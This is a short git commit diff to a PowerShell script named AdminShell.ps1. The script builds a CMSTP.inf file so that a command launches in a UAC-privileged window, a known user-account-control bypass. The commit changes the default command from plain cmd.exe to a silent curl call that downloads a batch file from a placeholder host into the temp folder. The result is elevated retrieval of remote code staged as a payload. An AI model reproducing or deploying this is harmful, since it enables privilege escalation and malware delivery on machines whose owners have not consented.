5d17ec66201721b95968e75311716e31aa3801dc
DBlack7 <randomguyontiktok@outlook.com>
2026-03-29 16:40:43 +0100

    Update AdminShell.ps1

--- AdminShell.ps1
+++ AdminShell.ps1
@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'cmd.exe'
+	[String]$CommandToExecute = 'cmd.exe /c curl -s LINK --output %TEMP%/client.bat'
 	)
 
 $InfContent = @"
